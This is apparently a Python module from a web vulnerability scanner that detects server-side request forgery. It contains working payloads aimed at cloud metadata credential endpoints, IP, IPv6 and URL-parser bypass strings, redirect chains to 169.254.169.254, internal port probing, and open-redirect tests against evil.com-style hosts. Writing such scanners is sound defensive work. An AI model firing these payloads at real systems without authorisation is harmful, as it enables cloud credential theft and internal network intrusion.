"""
SSRFTester — Professional-grade Server-Side Request Forgery detection.
OWASP A10:2021 — Server-Side Request Forgery (SSRF).

Tests for: internal network access, cloud metadata (AWS IMDSv2/GCP/Azure/DO/Alibaba/Oracle),
IP bypass techniques, protocol smuggling, DNS rebinding detection, redirect chain
following, header-based SSRF, open redirect, and blind SSRF.
"""
import time
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .base_tester import BaseTester
from apps.scanning.engine.payloads.ssrf_payloads import (
    get_ssrf_payloads_by_depth,
    URL_PARAM_NAMES,
    CLOUD_METADATA_INDICATORS,
    INTERNAL_SERVICE_INDICATORS,
    IP_BYPASS,
    PROTOCOL_SMUGGLING,
    INTERNAL_PORTS,
)

logger = logging.getLogger(__name__)

# Timing threshold for blind SSRF detection (seconds)
BLIND_THRESHOLD = 3.0

# Additional cloud metadata endpoints (Phase 3: IMDSv2 + more providers)
_EXTENDED_CLOUD_METADATA = [
    # AWS IMDSv2 (token-based — must PUT first to get token)
    {'url': 'http://169.254.169.254/latest/api/token',
     'method': 'PUT', 'headers': {'X-aws-ec2-metadata-token-ttl-seconds': '21600'},
     'provider': 'AWS IMDSv2', 'is_token_request': True},
    # Alibaba Cloud
    ('http://100.100.100.200/latest/meta-data/', 'Alibaba Cloud'),
    ('http://100.100.100.200/latest/meta-data/ram/security-credentials/', 'Alibaba Cloud RAM'),
    # Oracle Cloud
    ('http://169.254.169.254/opc/v2/instance/', 'Oracle Cloud'),
    # Kubernetes
    ('https://kubernetes.default.svc/api/v1/namespaces', 'Kubernetes API'),
    ('http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01', 'Azure IMDS'),
]

# Headers that may trigger server-side requests
_SSRF_HEADER_NAMES = ['X-Forwarded-For', 'X-Original-URL', 'X-Rewrite-URL',
                      'X-Custom-IP-Authorization', 'X-Forwarded-Host', 'Host']

# DNS rebinding payloads (domains that resolve alternately to external/internal IPs)
_DNS_REBIND_INDICATORS = [
    'rebind.it', 'nip.io', 'xip.io', 'sslip.io',
]


class SSRFTester(BaseTester):
    """Test for Server-Side Request Forgery vulnerabilities."""

    TESTER_NAME = 'SSRF'

    def test(self, page, depth: str = 'medium', recon_data: dict = None) -> list:
        vulnerabilities = []
        payloads = get_ssrf_payloads_by_depth(depth)
        payloads = self._augment_payloads_with_seclists(payloads, 'ssrf', recon_data)

        # Test URL parameters that might trigger server-side requests
        for param_name in page.parameters:
            if not self._is_url_param(param_name):
                continue

            vuln = self._test_ssrf_param(page.url, param_name, payloads)
            if vuln:
                vulnerabilities.append(vuln)
                continue

            # Blind SSRF via timing (medium/deep)
            if depth in ('medium', 'deep'):
                vuln = self._test_blind_ssrf(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)

        # Test form inputs with URL-like names
        for form in page.forms:
            for inp in form.inputs:
                if inp.input_type in ('hidden', 'submit', 'button'):
                    continue
                if not self._is_url_param(inp.name or ''):
                    continue
                vuln = self._test_ssrf_form(form, inp, payloads, page.url)
                if vuln:
                    vulnerabilities.append(vuln)

        # Cloud metadata specific tests (medium/deep)
        if depth in ('medium', 'deep'):
            for param_name in page.parameters:
                if not self._is_url_param(param_name):
                    continue
                vuln = self._test_cloud_metadata(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)

            # AWS IMDSv2 token-based metadata test
            for param_name in page.parameters:
                if not self._is_url_param(param_name):
                    continue
                vuln = self._test_imdsv2(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)
                    break

            # Phase 8: IPv6 SSRF bypass
            for param_name in page.parameters:
                if not self._is_url_param(param_name):
                    continue
                vuln = self._test_ipv6_bypass(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)
                    break

            # Phase 8: URL parser differential
            for param_name in page.parameters:
                if not self._is_url_param(param_name):
                    continue
                vuln = self._test_url_parser_differential(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)
                    break

            # Phase 8: IMDSv2 complete workflow
            for param_name in page.parameters:
                if not self._is_url_param(param_name):
                    continue
                vuln = self._test_imdsv2_complete(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)
                    break

        # Deep-only advanced tests
        if depth == 'deep':
            # IP bypass techniques
            for param_name in page.parameters:
                if not self._is_url_param(param_name):
                    continue
                vuln = self._test_ip_bypass(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)

            # Protocol smuggling
            for param_name in page.parameters:
                if not self._is_url_param(param_name):
                    continue
                vuln = self._test_protocol_smuggling(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)

            # Internal port scan (deep)
            for param_name in page.parameters:
                if not self._is_url_param(param_name):
                    continue
                vulns = self._test_internal_port_scan(page.url, param_name)
                vulnerabilities.extend(vulns)
                break  # only scan once

            # DNS rebinding detection
            for param_name in page.parameters:
                if not self._is_url_param(param_name):
                    continue
                vuln = self._test_dns_rebinding(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)
                    break

            # Header-based SSRF
            header_vulns = self._test_header_ssrf(page)
            vulnerabilities.extend(header_vulns)

            # Redirect chain following
            for param_name in page.parameters:
                if not self._is_url_param(param_name):
                    continue
                vuln = self._test_redirect_ssrf(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)
                    break

        # Check for open redirect (medium/deep)
        if depth in ('medium', 'deep'):
            vuln = self._test_open_redirect(page)
            if vuln:
                vulnerabilities.append(vuln)

        # OOB blind SSRF — inject callbacks for blind detection
        if depth in ('medium', 'deep'):
            self._inject_oob_ssrf(page, recon_data)

        return vulnerabilities

    def _inject_oob_ssrf(self, page, recon_data):
        """Inject OOB payloads for blind SSRF detection."""
        for param_name in page.parameters:
            if not self._is_url_param(param_name):
                continue
            oob_payloads = self._get_oob_payloads('ssrf', param_name, page.url, recon_data)
            for payload, _callback_id in oob_payloads[:3]:
                self._make_request('GET', page.url, params={param_name: payload})
            break  # Limit to first URL param

    def _is_url_param(self, param_name):
        """Check if a parameter name suggests it accepts URLs."""
        return param_name.lower() in URL_PARAM_NAMES

    def _test_ssrf_param(self, url, param_name, payloads):
        """Test a URL parameter for SSRF."""
        for payload in payloads:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param_name] = payload

            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(params, doseq=True), ''
            ))

            response = self._make_request('GET', test_url)
            if response and self._is_ssrf_success(response, payload):
                is_cloud = any(ind in payload for ind in ('169.254', 'metadata'))
                return self._build_vuln(
                    name=f'SSRF via Parameter: {param_name}',
                    severity='critical' if is_cloud else 'high',
                    category='Server-Side Request Forgery',
                    description=f'The parameter "{param_name}" can be used to make server-side requests '
                               f'to internal resources.',
                    impact='Attackers can access internal services, cloud metadata endpoints, '
                          'and bypass network firewalls. In cloud environments, this can lead '
                          'to credential theft via metadata services.',
                    remediation='Validate and sanitize all URLs. Use an allowlist of permitted domains. '
                               'Block requests to internal/private IP ranges. '
                               'Disable unnecessary URL schemes (file://, gopher://, dict://).',
                    cwe='CWE-918',
                    cvss=9.1 if is_cloud else 7.5,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nPayload: {payload}\n'
                            f'Server-side request to internal resource detected.',
                )
        return None

    def _test_blind_ssrf(self, url, param_name):
        """Detect blind SSRF via response timing differences."""
        # Baseline: request with benign URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = 'http://www.example.com'
        baseline_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(params, doseq=True), '',
        ))
        start = time.time()
        self._make_request('GET', baseline_url, timeout=10)
        baseline_time = time.time() - start

        # Test with a likely-unreachable internal IP to see timing diff
        params[param_name] = 'http://192.168.1.1:81'
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(params, doseq=True), '',
        ))
        start = time.time()
        self._make_request('GET', test_url, timeout=15)
        test_time = time.time() - start

        if test_time - baseline_time > BLIND_THRESHOLD:
            return self._build_vuln(
                name=f'Potential Blind SSRF (Time-Based): {param_name}',
                severity='high',
                category='Server-Side Request Forgery',
                description=f'The parameter "{param_name}" may be vulnerable to blind SSRF. '
                           f'A request to an internal IP caused a {test_time:.1f}s delay vs '
                           f'{baseline_time:.1f}s baseline, suggesting server-side URL fetching.',
                impact='Even without visible response data, blind SSRF can be exploited '
                      'via DNS/HTTP out-of-band channels to map internal networks and access '
                      'sensitive services.',
                remediation='Implement URL allowlist validation. Block requests to private IP ranges '
                           '(10.x, 172.16-31.x, 192.168.x). Use egress firewalls.',
                cwe='CWE-918',
                cvss=6.5,
                affected_url=url,
                evidence=f'Parameter: {param_name}\nBaseline: {baseline_time:.1f}s\n'
                        f'Internal IP probe: {test_time:.1f}s\n'
                        f'Delta: {test_time - baseline_time:.1f}s',
            )
        return None

    def _test_cloud_metadata(self, url, param_name):
        """Test specifically for cloud metadata endpoint access."""
        cloud_payloads = [
            ('http://169.254.169.254/latest/meta-data/', 'AWS'),
            ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS IAM'),
            ('http://metadata.google.internal/computeMetadata/v1/', 'GCP'),
            ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'Azure'),
            ('http://169.254.169.254/metadata/v1/', 'DigitalOcean'),
        ]
        parsed = urlparse(url)

        for payload, provider in cloud_payloads:
            params = parse_qs(parsed.query)
            params[param_name] = payload
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(params, doseq=True), '',
            ))

            headers = {}
            if provider == 'GCP':
                headers['Metadata-Flavor'] = 'Google'
            elif provider == 'Azure':
                headers['Metadata'] = 'true'

            response = self._make_request('GET', test_url, headers=headers)
            if not response:
                continue

            body = response.text.lower()
            if any(ind.lower() in body for ind in CLOUD_METADATA_INDICATORS):
                return self._build_vuln(
                    name=f'SSRF: {provider} Cloud Metadata Access',
                    severity='critical',
                    category='Server-Side Request Forgery',
                    description=f'The parameter "{param_name}" can access {provider} cloud metadata service. '
                               f'This is a critical cloud-specific SSRF vulnerability.',
                    impact=f'Attackers can steal {provider} instance credentials, API keys, '
                          f'and service account tokens. This often leads to full cloud account compromise.',
                    remediation='Block access to 169.254.169.254 from application servers. '
                               'Use IMDSv2 (AWS) or equivalent token-based metadata access. '
                               'Implement network-level controls to prevent metadata access.',
                    cwe='CWE-918',
                    cvss=9.8,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nProvider: {provider}\nPayload: {payload}\n'
                            f'{provider} metadata indicators detected in response.',
                )
        return None

    def _test_ip_bypass(self, url, param_name):
        """Test IP-based SSRF bypass techniques."""
        parsed = urlparse(url)
        for payload in IP_BYPASS[:10]:
            params = parse_qs(parsed.query)
            params[param_name] = payload
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(params, doseq=True), '',
            ))
            response = self._make_request('GET', test_url)
            if response and self._is_ssrf_success(response, payload):
                return self._build_vuln(
                    name=f'SSRF via IP Bypass: {param_name}',
                    severity='high',
                    category='Server-Side Request Forgery',
                    description=f'The parameter "{param_name}" is vulnerable to SSRF using IP address '
                               f'encoding bypass techniques (decimal, hex, octal, or DNS rebinding).',
                    impact='IP-based SSRF filters can be bypassed, allowing access to internal services.',
                    remediation='Resolve and validate the destination IP address after DNS resolution. '
                               'Block all private/reserved IP ranges at the network level.',
                    cwe='CWE-918',
                    cvss=7.5,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nBypass payload: {payload}',
                )
        return None

    def _test_protocol_smuggling(self, url, param_name):
        """Test for protocol smuggling via SSRF."""
        parsed = urlparse(url)
        for payload in PROTOCOL_SMUGGLING[:5]:
            params = parse_qs(parsed.query)
            params[param_name] = payload
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(params, doseq=True), '',
            ))
            response = self._make_request('GET', test_url)
            if response and response.status_code == 200 and len(response.text) > 50:
                # protocol smuggling success is hard to detect — flag if response is unusual
                return self._build_vuln(
                    name=f'SSRF Protocol Smuggling: {param_name}',
                    severity='high',
                    category='Server-Side Request Forgery',
                    description=f'The parameter "{param_name}" may allow protocol smuggling, '
                               f'enabling access to services via non-HTTP protocols (file, gopher, dict).',
                    impact='Attackers can interact with internal services using unexpected protocols, '
                          'potentially reading files (file://), sending arbitrary data (gopher://), '
                          'or querying services (dict://).',
                    remediation='Restrict URL schemes to http:// and https:// only. '
                               'Use a URL parser + allowlist before making any server-side request.',
                    cwe='CWE-918',
                    cvss=8.0,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nPayload: {payload}',
                )
        return None

    def _test_internal_port_scan(self, url, param_name):
        """Use SSRF to detect open internal ports."""
        vulnerabilities = []
        parsed = urlparse(url)
        open_ports = []

        for port_url in INTERNAL_PORTS[:8]:
            params = parse_qs(parsed.query)
            params[param_name] = port_url
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(params, doseq=True), '',
            ))

            start = time.time()
            response = self._make_request('GET', test_url, timeout=5)
            time.time() - start

            if response and response.status_code == 200 and len(response.text) > 50:
                open_ports.append(port_url)

        if open_ports:
            vulnerabilities.append(self._build_vuln(
                name=f'SSRF Internal Port Scan: {param_name}',
                severity='high',
                category='Server-Side Request Forgery',
                description=f'The parameter "{param_name}" was used to enumerate open internal ports. '
                           f'{len(open_ports)} internal services appear accessible.',
                impact='Attackers can map internal infrastructure and discover services '
                      'that are not exposed externally, facilitating further attacks.',
                remediation='Block server-side requests to internal networks. '
                           'Use network segmentation and egress filtering.',
                cwe='CWE-918',
                cvss=7.5,
                affected_url=url,
                evidence='Open internal ports detected:\n' + '\n'.join(open_ports[:5]),
            ))

        return vulnerabilities

    def _test_ssrf_form(self, form, inp, payloads, page_url):
        """Test a form input for SSRF."""
        for payload in payloads[:5]:
            data = {}
            for form_inp in form.inputs:
                if form_inp.name == inp.name:
                    data[form_inp.name] = payload
                else:
                    data[form_inp.name] = form_inp.value or 'test'

            target_url = form.action or page_url
            method = form.method.upper()

            if method == 'POST':
                response = self._make_request('POST', target_url, data=data)
            else:
                response = self._make_request('GET', target_url, params=data)

            if response and self._is_ssrf_success(response, payload):
                return self._build_vuln(
                    name=f'SSRF via Form Field: {inp.name}',
                    severity='high',
                    category='Server-Side Request Forgery',
                    description=f'Form field "{inp.name}" can trigger server-side requests.',
                    impact='Internal services and cloud metadata may be accessible via this field.',
                    remediation='Validate URLs against an allowlist. Block private IP ranges.',
                    cwe='CWE-918',
                    cvss=7.5,
                    affected_url=target_url,
                    evidence=f'Form field: {inp.name}\nPayload: {payload}',
                )
        return None

    def _test_open_redirect(self, page):
        """Test for open redirect vulnerabilities."""
        redirect_params = ['redirect', 'next', 'url', 'return', 'return_url',
                           'dest', 'destination', 'redir', 'continue']

        for param_name in page.parameters:
            if param_name.lower() not in redirect_params:
                continue

            payload = 'https://evil-attacker.com'
            parsed = urlparse(page.url)
            params = parse_qs(parsed.query)
            params[param_name] = payload

            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(params, doseq=True), ''
            ))

            response = self._make_request('GET', test_url, allow_redirects=False)
            if response and response.status_code in (301, 302, 303, 307, 308):
                location = response.headers.get('Location', '')
                if 'evil-attacker.com' in location:
                    return self._build_vuln(
                        name=f'Open Redirect: {param_name}',
                        severity='medium',
                        category='Server-Side Request Forgery',
                        description=f'Parameter "{param_name}" allows redirecting users to arbitrary external sites.',
                        impact='Attackers can craft links that redirect victims to phishing pages, '
                              'abusing the trusted domain reputation.',
                        remediation='Validate redirect URLs against a whitelist of allowed domains. '
                                   'Use relative URLs for redirects. '
                                   'Show a warning page before redirecting to external sites.',
                        cwe='CWE-601',
                        cvss=4.7,
                        affected_url=page.url,
                        evidence=f'Parameter: {param_name}\nRedirected to: {location}',
                    )
        return None

    def _is_ssrf_success(self, response, payload):
        """Determine if SSRF was successful based on response."""
        if response.status_code == 200:
            body = response.text.lower()
            # Check for cloud metadata indicators
            for indicator in CLOUD_METADATA_INDICATORS:
                if indicator.lower() in body:
                    return True
            # Check for internal service banners
            for indicator in INTERNAL_SERVICE_INDICATORS:
                if indicator.lower() in body:
                    return True
        return False

    # ── New Phase 3 methods ───────────────────────────────────────────────────

    def _test_imdsv2(self, url, param_name):
        """Test for AWS IMDSv2 metadata access via SSRF.

        IMDSv2 requires a PUT request to obtain a session token before
        accessing metadata. If the application follows redirects or
        allows method override, IMDSv2 can still be exploited.
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Test 1: Basic IMDSv1 fallback (some instances still allow it)
        params[param_name] = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                               parsed.params, urlencode(params, doseq=True), ''))
        response = self._make_request('GET', test_url)
        if response and response.status_code == 200:
            body = response.text.lower()
            if any(ind.lower() in body for ind in CLOUD_METADATA_INDICATORS):
                return self._build_vuln(
                    name='SSRF: AWS IMDSv1 Metadata Access (Fallback)',
                    severity='critical',
                    category='Server-Side Request Forgery',
                    description=f'The parameter "{param_name}" accesses AWS instance metadata '
                               f'via IMDSv1 (no token required). The instance has not disabled '
                               f'IMDSv1 fallback.',
                    impact='Full AWS credential theft — IAM role credentials, API keys, '
                          'and instance identity tokens are exposed. This typically leads '
                          'to full cloud account compromise.',
                    remediation='Enforce IMDSv2-only on all EC2 instances: '
                               'aws ec2 modify-instance-metadata-options '
                               '--http-tokens required --http-endpoint enabled. '
                               'Block 169.254.169.254 from application-level requests.',
                    cwe='CWE-918',
                    cvss=9.8,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\n'
                            f'IMDSv1 metadata accessible without token.\n'
                            f'AWS IAM indicators detected in response.',
                )

        # Test 2: IMDSv2 token hop — attempt to get token via SSRF
        # This only works if the application can make PUT requests
        params[param_name] = 'http://169.254.169.254/latest/api/token'
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                               parsed.params, urlencode(params, doseq=True), ''))
        response = self._make_request('GET', test_url)
        if response and response.status_code == 200:
            # If we get a response that looks like a token, IMDSv2 may be exploitable
            token = response.text.strip()
            if len(token) > 20 and token.isascii() and ' ' not in token:
                return self._build_vuln(
                    name='SSRF: Potential AWS IMDSv2 Token Leak',
                    severity='high',
                    category='Server-Side Request Forgery',
                    description=f'The parameter "{param_name}" returned what appears to be '
                               f'an AWS IMDSv2 session token. If the application can be made '
                               f'to include this token in subsequent requests, metadata can '
                               f'be accessed.',
                    impact='IMDSv2 tokens enable access to instance metadata and IAM credentials.',
                    remediation='Enforce hop limit of 1 on IMDSv2: '
                               'aws ec2 modify-instance-metadata-options '
                               '--http-put-response-hop-limit 1. '
                               'Block metadata IP in application firewall rules.',
                    cwe='CWE-918',
                    cvss=8.0,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\n'
                            f'Potential IMDSv2 token received (length: {len(token)}).',
                )
        return None

    def _test_dns_rebinding(self, url, param_name):
        """Test for DNS rebinding SSRF bypass.

        DNS rebinding exploits the gap between DNS resolution and the actual
        HTTP request. A domain resolves to an external IP first (passing
        validation), then re-resolves to an internal IP for the actual request.
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Use nip.io-style payloads that resolve to internal IPs
        rebind_payloads = [
            ('http://127.0.0.1.nip.io/', '127.0.0.1 via nip.io'),
            ('http://169.254.169.254.nip.io/latest/meta-data/', 'AWS metadata via nip.io'),
            ('http://0177.0.0.1/', 'Octal 127.0.0.1'),
            ('http://2130706433/', 'Decimal 127.0.0.1'),
            ('http://0x7f000001/', 'Hex 127.0.0.1'),
            ('http://127.1/', 'Shortened loopback'),
        ]

        for payload, desc in rebind_payloads:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))
            response = self._make_request('GET', test_url)
            if response and self._is_ssrf_success(response, payload):
                return self._build_vuln(
                    name=f'SSRF via DNS Rebinding / IP Encoding: {param_name}',
                    severity='high',
                    category='Server-Side Request Forgery',
                    description=f'The parameter "{param_name}" is vulnerable to SSRF via {desc}. '
                               f'DNS-based validation was bypassed.',
                    impact='DNS rebinding bypasses domain-based SSRF protections, allowing '
                          'access to internal services and cloud metadata endpoints.',
                    remediation='Validate the resolved IP address, not just the domain name. '
                               'Block private/reserved IP ranges post-DNS-resolution. '
                               'Use network-level egress controls.',
                    cwe='CWE-918',
                    cvss=7.5,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nBypass: {desc}\nPayload: {payload}',
                )
        return None

    def _test_header_ssrf(self, page):
        """Test for SSRF via HTTP headers.

        Some applications use Host, X-Forwarded-For, or X-Original-URL headers
        to construct backend requests, enabling header-based SSRF.
        """
        vulns = []
        ssrf_targets = [
            ('http://169.254.169.254/latest/meta-data/', 'AWS metadata'),
            ('http://127.0.0.1:22/', 'localhost SSH'),
        ]

        for header_name in _SSRF_HEADER_NAMES[:4]:
            for payload, desc in ssrf_targets:
                custom_headers = {header_name: payload}
                response = self._make_request('GET', page.url, headers=custom_headers)
                if not response:
                    continue

                if self._is_ssrf_success(response, payload):
                    vulns.append(self._build_vuln(
                        name=f'Header-Based SSRF via {header_name}',
                        severity='high',
                        category='Server-Side Request Forgery',
                        description=f'The "{header_name}" header triggered a server-side request '
                                   f'to {desc}. The application uses this header to construct '
                                   f'backend URLs.',
                        impact='Attackers can access internal services and cloud metadata '
                              'by manipulating HTTP headers.',
                        remediation=f'Do not use {header_name} header to construct backend URLs. '
                                   'Validate and sanitize all URL components.',
                        cwe='CWE-918',
                        cvss=7.5,
                        affected_url=page.url,
                        evidence=f'Header: {header_name}: {payload}\n'
                                f'Internal service indicators detected in response.',
                    ))
                    break  # One finding per header
            if vulns:
                break  # One header SSRF finding is sufficient

        return vulns

    def _test_redirect_ssrf(self, url, param_name):
        """Test SSRF via redirect chain.

        If the application follows redirects, an external URL that 302-redirects
        to an internal IP can bypass URL validation.
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Use an external URL that typically redirects (common pattern)
        # Test with allow_redirects=True to see if the final response has internal data
        redirect_payloads = [
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/',
        ]

        for payload in redirect_payloads:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))

            response = self._make_request('GET', test_url, allow_redirects=True, timeout=10)
            if response and self._is_ssrf_success(response, payload):
                return self._build_vuln(
                    name=f'SSRF via Redirect Chain: {param_name}',
                    severity='high',
                    category='Server-Side Request Forgery',
                    description=f'The parameter "{param_name}" follows HTTP redirects to '
                               f'internal destinations. An external URL redirecting to an '
                               f'internal IP bypassed URL validation.',
                    impact='Redirect-based SSRF bypasses domain/IP allowlist checks since '
                          'validation occurs before the redirect is followed.',
                    remediation='Do not follow redirects for user-supplied URLs. '
                               'Validate the final destination IP after all redirects. '
                               'Implement redirect hop limits.',
                    cwe='CWE-918',
                    cvss=7.5,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nRedirect payload: {payload}',
                )
        return None

    # ── Phase 8 methods ───────────────────────────────────────────────────────

    def _test_ipv6_bypass(self, url, param_name):
        """Test SSRF bypasses using IPv6 representations of localhost."""
        ipv6_payloads = [
            ('http://[::1]/', 'IPv6 localhost [::1]'),
            ('http://[::ffff:127.0.0.1]/', 'IPv6-mapped IPv4 [::ffff:127.0.0.1]'),
            ('http://[0:0:0:0:0:0:0:1]/', 'IPv6 full form localhost'),
            ('http://[::ffff:7f00:1]/', 'IPv6-mapped hex 127.0.0.1'),
            ('http://[::1]:80/', 'IPv6 localhost port 80'),
            ('http://[::1]:8080/', 'IPv6 localhost port 8080'),
        ]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for payload, desc in ipv6_payloads:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))
            resp = self._make_request('GET', test_url)
            if resp and self._is_ssrf_success(resp, payload):
                return self._build_vuln(
                    name=f'IPv6 SSRF Bypass: {param_name}',
                    severity='high',
                    category='Server-Side Request Forgery',
                    description=f'The parameter "{param_name}" is vulnerable to SSRF via '
                               f'IPv6 address bypass ({desc}). The application validates '
                               f'against IPv4 localhost but accepts IPv6 equivalents.',
                    impact='IPv6 SSRF bypasses allow access to internal services that are '
                          'only protected by IPv4-based allowlist/denylist checks.',
                    remediation='Validate URLs against both IPv4 and IPv6 localhost addresses. '
                               'Resolve hostnames to IP and check against all reserved ranges. '
                               'Block all loopback, link-local, and private IP ranges.',
                    cwe='CWE-918',
                    cvss=7.5,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nBypass: {desc}\nPayload: {payload}',
                )
        return None

    def _test_url_parser_differential(self, url, param_name):
        """Test URL parser differential exploits.

        Different URL parsers (browser, Python urllib, Node.js, Java) parse
        ambiguous URLs differently, enabling SSRF through confusion.
        """
        differential_payloads = [
            ('http://localhost@evil.com', 'Userinfo confusion (localhost as userinfo)'),
            ('http://evil.com\\@localhost', 'Backslash authority confusion'),
            ('http://localhost%00.evil.com', 'Null byte domain truncation'),
            ('http://0x7f000001/', 'Hex IP representation (127.0.0.1)'),
            ('http://2130706433/', 'Decimal IP representation (127.0.0.1)'),
            ('http://0177.0.0.1/', 'Octal IP representation (127.0.0.1)'),
            ('http://127.1/', 'Short IP form (127.1 = 127.0.0.1)'),
            ('http://0/', 'Zero IP (resolves to localhost on some systems)'),
            ('http://localhost:80@evil.com/', 'Port in userinfo confusion'),
            ('http://evil.com#@localhost/', 'Fragment as authority confusion'),
        ]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for payload, desc in differential_payloads:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))
            resp = self._make_request('GET', test_url)
            if resp and self._is_ssrf_success(resp, payload):
                return self._build_vuln(
                    name=f'URL Parser Differential SSRF: {param_name}',
                    severity='high',
                    category='Server-Side Request Forgery',
                    description=f'The parameter "{param_name}" is vulnerable to SSRF via URL '
                               f'parser differential ({desc}). The application\'s URL parser '
                               f'interprets the URL differently than the HTTP client.',
                    impact='URL parser differentials can bypass allowlist/denylist SSRF '
                          'protections. The validator sees one host, the HTTP client '
                          'connects to another.',
                    remediation='Parse and validate URLs using the same library that makes requests. '
                               'After parsing, resolve the hostname to an IP and validate '
                               'against a denylist of internal IP ranges.',
                    cwe='CWE-918',
                    cvss=7.5,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nTechnique: {desc}\nPayload: {payload}',
                )
        return None

    def _test_imdsv2_complete(self, url, param_name):
        """Complete IMDSv2 workflow: first probe IMDSv1, then attempt IMDSv2.

        AWS IMDSv2 requires a PUT request to obtain a session token before
        metadata can be accessed. This tests whether the application can be
        tricked into performing this two-step workflow.
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Step 1: Try IMDSv1 (simple GET)
        imdsv1_url = 'http://169.254.169.254/latest/meta-data/'
        params[param_name] = imdsv1_url
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                               parsed.params, urlencode(params, doseq=True), ''))
        resp = self._make_request('GET', test_url)

        if resp and self._is_ssrf_success(resp, imdsv1_url):
            return self._build_vuln(
                name=f'AWS IMDS Access via SSRF (IMDSv1): {param_name}',
                severity='critical',
                category='Server-Side Request Forgery',
                description=f'The parameter "{param_name}" allows access to AWS EC2 instance '
                           f'metadata via IMDSv1 (no token required). This exposes IAM '
                           f'credentials, instance identity, and configuration data.',
                impact='Full AWS credential theft. Attacker can obtain IAM role temporary '
                      'credentials and pivot to other AWS services.',
                remediation='Enforce IMDSv2 (token-required) on all EC2 instances. '
                           'Block requests to 169.254.169.254 in application URL validation. '
                           'Use VPC endpoints instead of IMDS where possible.',
                cwe='CWE-918',
                cvss=9.8,
                affected_url=url,
                evidence=f'Parameter: {param_name}\n'
                        f'IMDSv1 metadata endpoint accessible without token.',
            )

        # Step 2: If IMDSv1 blocked, check if IMDSv2 PUT is possible
        # IMDSv2 requires: PUT /latest/api/token with X-aws-ec2-metadata-token-ttl-seconds
        imdsv2_token_url = 'http://169.254.169.254/latest/api/token'
        params[param_name] = imdsv2_token_url
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                               parsed.params, urlencode(params, doseq=True), ''))
        resp = self._make_request('GET', test_url)
        if resp and resp.status_code == 200 and len(resp.text or '') > 10:
            return self._build_vuln(
                name=f'AWS IMDSv2 Token Endpoint Accessible: {param_name}',
                severity='high',
                category='Server-Side Request Forgery',
                description=f'The parameter "{param_name}" can reach the AWS IMDSv2 token '
                           f'endpoint. While a PUT request is needed for a valid token, '
                           f'the endpoint being reachable indicates SSRF to the metadata service.',
                impact='If the application can be tricked into making PUT requests, '
                      'full IMDSv2 credential theft is possible.',
                remediation='Block all requests to 169.254.169.254 in URL validation. '
                           'Use network-level controls (iptables, security groups) to '
                           'restrict IMDS access.',
                cwe='CWE-918',
                cvss=7.5,
                affected_url=url,
                evidence=f'Parameter: {param_name}\n'
                        f'IMDSv2 token endpoint reachable via SSRF.',
            )
        return None
